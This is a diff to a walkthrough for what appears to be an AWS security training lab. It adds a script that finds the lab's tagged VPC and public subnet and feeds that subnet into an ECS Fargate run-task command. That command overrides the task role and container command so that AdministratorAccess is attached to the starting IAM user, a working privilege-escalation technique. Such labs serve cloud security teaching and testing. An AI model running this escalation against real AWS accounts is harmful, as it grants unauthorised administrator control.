@@ -39,13 +39,29 @@ aws ecs list-task-definitions --family-prefix pl-prod-ecs-008-existing-task --st
 There is an existing cluster and a Fargate-compatible task definition. This is your foothold. You also need network configuration to launch a Fargate task -- find a subnet to use:
 
 ```bash
-# Get the default VPC
-aws ec2 describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text
-# vpc-xxxxxxxxxxxxxxxxx
+# Discover the custom network deployed by the lab environment.
+LAB_VPC=$(aws ec2 describe-vpcs \
+  --filters "Name=tag:Name,Values=pathfinding" "Name=is-default,Values=false" \
+  --query 'Vpcs[].VpcId' --output text) || exit 1
 
-# Get a subnet in that VPC
-aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-xxxxxxxxxxxxxxxxx" --query 'Subnets[0].SubnetId' --output text
-# subnet-xxxxxxxxxxxxxxxxx
+if [[ ! "$LAB_VPC" =~ ^vpc-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one custom pathfinding VPC. Check the account, region, and lab environment deployment." >&2
+  exit 1
+fi
+
+LAB_SUBNET=$(aws ec2 describe-subnets \
+  --filters "Name=vpc-id,Values=$LAB_VPC" \
+    "Name=tag:Name,Values=pathfinding Operational Subnet 1" \
+    "Name=map-public-ip-on-launch,Values=true" \
+  --query 'Subnets[].SubnetId' --output text) || exit 1
+
+if [[ ! "$LAB_SUBNET" =~ ^subnet-[0-9a-f]+$ ]]; then
+  echo "Expected exactly one public Pathfinding Operational Subnet 1 in $LAB_VPC." >&2
+  exit 1
+fi
+
+echo "Pathfinding VPC: $LAB_VPC"
+echo "Public subnet: $LAB_SUBNET"
 ```
 
 ## Exploitation
@@ -82,7 +98,7 @@ aws ecs run-task \
   --cluster pl-prod-ecs-008-cluster \
   --task-definition pl-prod-ecs-008-existing-task \
   --launch-type FARGATE \
-  --network-configuration "awsvpcConfiguration={subnets=[subnet-xxxxxxxxxxxxxxxxx],assignPublicIp=ENABLED}" \
+  --network-configuration "awsvpcConfiguration={subnets=[$LAB_SUBNET],assignPublicIp=ENABLED}" \
   --overrides '{"taskRoleArn":"arn:aws:iam::<ACCOUNT_ID>:role/pl-prod-ecs-008-to-admin-target-role","containerOverrides":[{"name":"app","command":["iam","attach-user-policy","--user-name","pl-prod-ecs-008-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]}'
 ```
 
